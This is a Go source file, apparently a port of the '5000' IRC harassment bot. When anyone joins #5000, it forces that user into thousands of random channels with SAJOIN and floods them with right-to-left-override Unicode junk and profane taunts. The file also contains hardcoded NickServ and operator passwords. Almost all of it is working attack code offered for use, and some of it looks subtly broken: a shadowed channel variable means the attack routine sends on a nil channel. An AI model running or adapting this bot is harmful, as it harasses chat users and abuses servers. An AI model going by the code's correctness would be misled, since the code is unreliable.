package main

// Original 5000 bot was written in Python. This is a Go port of it by acidvegas.

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"
	"unicode/utf16"
)

var sendChannel chan<- string

const (
	nickname = "FUCKYOU"
	username = "5000"
	realname = "\x0304THROWN INTO THE FUCKING WALL\x0f"
)

func randomASCIIString(n int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func unicodeString() string {
	msg := "\u202e\u0007\x03" + fmt.Sprintf("%d", rand.Intn(12)+2)
	for i := 0; i < rand.Intn(101)+200; i++ {
		r := rand.Intn(0x2001) + 0x1000
		if r < 0x10000 {
			msg += string(rune(r))
		} else {
			r -= 0x10000
			msg += string(utf16.DecodeRune(rune(r>>10+0xD800), rune(r&0x3FF+0xDC00)))
		}
	}
	return msg
}

func attack(target string) {
	sendChannel <- fmt.Sprintf("PRIVMSG #superbowl :I am fucking the shit out of %s right now...", target)
	for i := 0; i < 200; i++ {
		var channels []string
		for i := 0; i < 25; i++ {
			channelName := "#" + randomASCIIString(5)
			channels = append(channels, channelName)
		}
		result := strings.Join(channels, ",")
		sendChannel <- fmt.Sprintf("SAJOIN %s #%s", target, result)
		sendChannel <- fmt.Sprintf("PRIVMSG #5000 :%s oh god %s what is happening %s", unicodeString(), target, unicodeString())
		sendChannel <- fmt.Sprintf("PRIVMSG %s :%s oh god %s what is happening %s", target, unicodeString(), target, unicodeString())
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	for {
		conn, err := tls.Dial("tcp", "localhost:6697", &tls.Config{InsecureSkipVerify: true})
		if err != nil {
			log.Println("Failed to connect: %v", err)
			time.Sleep(15 * time.Second)
			continue
		}

		messageChannel := make(chan string, 100) // INCOMING
		sendChannel := make(chan string, 100)    // OUTGOING
		quit := make(chan struct{})

		timeoutDuration := 300 * time.Second
		timeoutTimer := time.NewTimer(timeoutDuration)

		go func() {
			reader := bufio.NewReader(conn)
			for {
				line, err := reader.ReadString('\n')
				if err != nil {
					log.Println("Error reading from server:", err)
					conn.Close()
					close(quit)
					return
				}
				select {
				case messageChannel <- line:
					timeoutTimer.Reset(timeoutDuration)
				case <-quit:
					return
				case <-timeoutTimer.C:
					log.Println("No data received for 300 seconds. Reconnecting...")
					conn.Close()
					close(quit)
					return
				}
			}
		}()

		go func() {
			for {
				select {
				case message := <-sendChannel:
					data := []byte(message)
					if len(data) > 510 {
						data = data[:510]
					}
					_, err := conn.Write(append(data, '\r', '\n'))
					if err != nil {
						log.Println("Error writing to server:", err)
						conn.Close()
						close(quit)
						return
					}
				case <-quit:
					return
				}
			}
		}()

		sendChannel <- fmt.Sprintf("NICK FUCKYOU")
		sendChannel <- fmt.Sprintf("USER 5000 0 * :THROW INTO THE FUCKING WALL")

		for {
			handleMessage(<-messageChannel, sendChannel)
		}

		conn.Close()
		//close(quit)
		time.Sleep(15 * time.Second)
	}
}

func handleMessage(message string, sendChannel chan<- string) {
	fmt.Println(message)
	parts := strings.Split(message, " ")
	if len(parts) > 1 && parts[0] == "PING" {
		sendChannel <- fmt.Sprintf("PONG %s", parts[1])
	} else if len(parts) > 2 && parts[1] == "001" {
		time.Sleep(5 * time.Second)
		sendChannel <- fmt.Sprintf("MODE FUCKYOU +BDd")
		sendChannel <- fmt.Sprintf("PRIVMSG NickServ IDENTIFY FUCKYOU simps0nsfan420")
		sendChannel <- fmt.Sprintf("PRIVMSG OPER FUCKYOU fartsimps0n420")
		sendChannel <- fmt.Sprintf("JOIN #5000")
		sendChannel <- fmt.Sprintf("JOIN #superbowl")
	} else if len(parts) == 3 {
		if parts[1] == "JOIN" && parts[2] == "#5000" {
			nick := strings.Split(parts[0], "!")[0][1:]
			if nick != "acidvegas" && nick != "ChanServ" && nick != "FUCKYOU" {
				go attack(nick)
			}
		}
	}
}
